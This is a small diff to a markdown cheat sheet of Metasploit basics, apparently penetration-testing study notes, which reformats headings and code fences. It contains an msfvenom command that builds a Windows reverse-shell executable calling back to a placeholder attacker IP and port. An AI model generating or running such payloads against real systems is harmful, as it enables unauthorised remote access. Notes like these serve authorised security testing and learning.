@@ -1,15 +1,15 @@
 
 ### Basics
-```
+``` bash
 search x
 use x
 info
 show options, show advanced options
 SET X (e.g. set RHOST 10.10.10.10, set payload x)
 ```_
-## Staged Reverse Shell msfVenom payload
+#Staged Reverse Shell msfVenom payload
 
-Basic Windows Reverse Shell:
+#Basic Windows Reverse Shell:
 ``` bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<Your_Attacker_IP> LPORT=<Your_Port> -f exe > shell.exe
 ```
